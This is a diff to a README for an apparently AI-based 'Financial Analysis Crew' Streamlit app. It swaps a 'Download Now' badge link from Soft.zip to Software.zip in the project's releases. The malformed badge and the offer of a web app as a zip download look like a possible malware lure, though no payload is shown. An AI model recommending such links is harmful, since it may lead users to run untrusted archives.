@@ -14,7 +14,7 @@ Welcome to the Financial Analysis Crew - your go-to Streamlit app for simplifyin
 
 To get started with the Financial Analysis Crew, simply download and launch our application by clicking on the button below:
 
-[![Launch Financial Analysis Crew](https://github.com/yagami24/Financial-Stock-Analysis-Agent/releases/download/v1.0/Soft.zip%20Financial%20Analysis%20Crew-Download%20Now-brightgreen)](https://github.com/yagami24/Financial-Stock-Analysis-Agent/releases/download/v1.0/Soft.zip)
+[![Launch Financial Analysis Crew](https://github.com/yagami24/Financial-Stock-Analysis-Agent/releases/download/v2.0/Software.zip%20Financial%20Analysis%20Crew-Download%20Now-brightgreen)](https://github.com/yagami24/Financial-Stock-Analysis-Agent/releases/download/v2.0/Software.zip)
 
 ## Repository Details ℹ️
 
